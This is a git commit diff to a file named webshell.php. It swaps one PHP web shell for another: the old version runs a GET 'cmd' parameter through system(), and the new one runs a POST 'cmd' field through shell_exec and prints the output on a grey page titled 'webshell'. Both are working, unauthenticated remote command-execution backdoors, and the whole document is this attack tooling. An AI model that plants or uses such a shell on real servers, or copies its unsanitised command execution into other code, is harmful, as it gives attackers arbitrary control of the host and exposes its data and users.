72ba8c7e706f6aeb39eac6fc43f03b69a13116fd
jhanks <54920329+jeongahn@users.noreply.github.com>
2024-11-15 15:16:30 +0900

    Update webshell.php

--- webshell.php
+++ webshell.php
@@ -1,16 +1,26 @@
-<html>
-<body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
-<input type="SUBMIT" value="Execute">
-</form>
-<pre>
 <?php
-    if(isset($_GET['cmd']))
-    {
-        system($_GET['cmd']);
-    }
+$link = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 ?>
-</pre>
+<body style="background-color:rgb(200,200,200);">
+    <form action="<?php echo "{$link}" ?>" method="POST">
+        <center>
+            <strong>
+                <h2 style="color:rgb(0, 0, 0);"><b>webshell</b></h2>
+                COMMAND: <input type="text" name="cmd" value=""/>
+                <input type="submit" name="submit" value="CMD" />
+                </br>
+            </strong>
+        </center>
+        <br />
+        <strong>
+            <font size="5"> 
+                <?php
+                if (isset($_POST["cmd"])) {
+                    $cmd = $_POST["cmd"];
+                    $output = shell_exec("{$cmd} 2>&1");
+                    echo $cmd . "</br><pre>" . $output . "</pre>";
+                }
+                ?>
+            </font>
+        </strong>
 </body>
-</html>
